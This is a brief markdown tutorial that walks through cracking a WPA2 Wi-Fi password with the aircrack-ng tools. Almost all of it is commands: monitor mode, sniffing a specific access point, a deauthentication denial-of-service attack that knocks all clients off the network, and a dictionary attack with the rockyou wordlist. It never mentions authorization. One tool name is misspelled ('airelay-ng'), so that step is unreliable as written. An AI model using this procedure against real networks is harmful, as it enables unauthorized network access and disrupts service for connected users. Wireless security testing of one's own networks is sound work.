# Performing WPA2 Password Cracking with AirCrack Toolkit

1.  Killing wireless interface blocking processes
```
airmon-ng check kill
```

2. Switching wireless interface into monitoring mode
```
airmon-ng start wlan0
```

3.  Sniffing wireless traffic on all channels
```
airodump-ng wlan0mon
```

4. Sniffing wireless traffic on selected channel (channel 1 in following example)
```
airodump-ng -c 1 wlan0mon
```

5. Sniffing wireless traffic on selected channel and selected AP MAC and writing data to a file (OURFILE)
```
airodump-ng -w OURFILE -c 1 --bssid 1c:1d:86:b6:c4:e0 wlan0mon
```

6. Performing DoS attack to disconnect all clients connected to the provided Access Point (AP)
    - Run the following command in new terminal window in parallel with airodump-ng command
    - Stop the command execution after a few packets and check the airodump-ng window if Handshake is captured.
```
airelay-ng -0 0 -a 1c:1d:86:b6:c4:e0 wlan0mon
```

7. If the handshake is captured successfully, we will need a wordlist to perform dictionary attacks. Kali Linux provides with a wordlist with more than 10 million passwords called rockyou.txt which is compressed in .gz. You can decompress the file with following command
    - If decompressed once, below command is not required and won't work.
```
gunzip /usr/share/wordlists/rockyou.txt
```

8. After the wordlist is decompressed, we will use aircrack-ng for cracking the WPA2 password by providing the captured handshake .cap file and wordlist as input.
```
aircrack-ng OURFILE-01.cap -w /usr/share/wordlists/rockyou.txt
```

9. Thus, you will successfully be able to crack the Wi-Fi WPA2 Password.

10. To run your Wi-Fi interface card back to normal mode, use the following command.
```
airmon-ng stop wlan0mon
service network-manager restart
```

